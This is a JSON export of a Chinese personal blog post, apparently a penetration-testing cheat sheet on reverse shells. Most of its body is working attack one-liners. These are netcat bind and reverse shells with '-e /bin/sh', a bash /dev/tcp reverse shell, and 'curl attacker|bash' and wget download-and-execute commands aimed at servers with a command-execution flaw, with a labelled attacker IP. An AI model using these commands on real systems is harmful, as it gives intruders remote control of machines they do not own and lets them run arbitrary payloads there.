{"title":"反弹shell","uid":"9b02ce479705b9f09b692586eea96671","slug":"Reverses-shell","date":"2023-02-13T13:56:59.573Z","updated":"2023-08-06T08:00:32.766Z","comments":true,"path":"api/articles/Reverses-shell.json","keywords":null,"cover":"/img/24.jpg","content":"<p><code>监听，弹弹弹</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"反弹shell姿势\"><a href=\"#反弹shell姿势\" class=\"headerlink\" title=\"反弹shell姿势\"></a>反弹shell姿势</h1><h2 id=\"netcat-一句话反弹\"><a href=\"#netcat-一句话反弹\" class=\"headerlink\" title=\"netcat 一句话反弹\"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>\n<h3 id=\"正向shell\"><a href=\"#正向shell\" class=\"headerlink\" title=\"正向shell\"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">客户端主动连接并得到反弹shell    \n    nc 服务端ip 8888\n服务端监听连接\n    nc -lvp 8888 -e &#x2F;bin&#x2F;sh \n    # windows上：nc -lvp 8888 -e c:\\windows\\system32\\cmd.exe <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"反向shell\"><a href=\"#反向shell\" class=\"headerlink\" title=\"反向shell\"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">客户端监听\nnc -lvp 8888 \n服务端连接客户端\nnc 客户端ip 8888 -e &#x2F;bin&#x2F;sh \n\nwindows上：nc ip 8888 -e c:\\windows\\system32\\cmd.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"bash反弹shell\"><a href=\"#bash反弹shell\" class=\"headerlink\" title=\"bash反弹shell\"></a>bash反弹shell</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;我们靶机ip&#x2F;我们靶机 port 0&gt;&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>\n<p><img src=\"/post/Reverses-shell/image-20221019235717724.png\" alt=\"image-20221019235717724\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p></blockquote>\n<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>\n<h2 id=\"curl反弹shell\"><a href=\"#curl反弹shell\" class=\"headerlink\" title=\"curl反弹shell\"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>\n<p>在存在<code>命令执行</code>的服务器上执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">curl [自己的服务器]ip|bash\n&#x2F;&#x2F;在利用curl里执行我自己的服务器上的bash一句话<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>\n<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.20.151&#x2F;7777 0&gt;&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>\n<p><img src=\"/post/Reverses-shell/image-20221020000027288.png\" alt=\"image-20221020000027288\"></p>\n<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>\n<p><img src=\"/post/Reverses-shell/image-20221020000337460.png\" alt=\"image-20221020000337460\"></p>\n<h2 id=\"wget方式反弹shell\"><a href=\"#wget方式反弹shell\" class=\"headerlink\" title=\"wget方式反弹shell\"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wget 192.168.20.130&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>\n<p> <img src=\"/post/Reverses-shell/image-20221020000353533.png\" alt=\"image-20221020000353533\"></p>\n","text":"监听，弹弹弹 反弹shell姿势netcat 一句话反弹获取shell（想反弹谁的shell就在谁的后面加-e /bin/sh或-e /bin/bash） 正向...","permalink":"/post/Reverses-shell","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"提权","slug":"提权","count":2,"path":"api/tags/提权.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">反弹shell姿势</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#netcat-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9\"><span class=\"toc-text\">netcat 一句话反弹</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A3%E5%90%91shell\"><span class=\"toc-text\">正向shell</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%90%91shell\"><span class=\"toc-text\">反向shell</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bash%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">bash反弹shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#curl%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">curl反弹shell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wget%E6%96%B9%E5%BC%8F%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">wget方式反弹shell</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"sqlmap使用总结","uid":"6e2bc51a8d48429972bd10fd836dd7b5","slug":"tooluse(sqlmap)","date":"2023-02-13T13:59:11.150Z","updated":"2023-08-06T08:00:51.000Z","comments":true,"path":"api/articles/tooluse(sqlmap).json","keywords":null,"cover":"/img/28.jpg","text":" 原文作者: Ywc 原文链接: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/ 发表日期: July ...","permalink":"/post/tooluse(sqlmap)","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"PHP函数记录","uid":"512d30341a0844883020fd5a4d84d838","slug":"php-functions","date":"2023-02-13T13:51:57.927Z","updated":"2023-09-08T09:09:39.575Z","comments":true,"path":"api/articles/php-functions.json","keywords":null,"cover":"/img/22.jpg","text":"还是挺重要的 PHP函数记录1)php函数md5 ps.sha1，由于此函数依赖的算法已不足够复杂,不推荐使用此函数对明文密码加密。目前大多用md5 但是和md...","permalink":"/post/php-functions","photos":[],"count_time":{"symbolsCount":"2.9k","symbolsTime":"3 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"PHP","slug":"PHP","count":1,"path":"api/tags/PHP.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}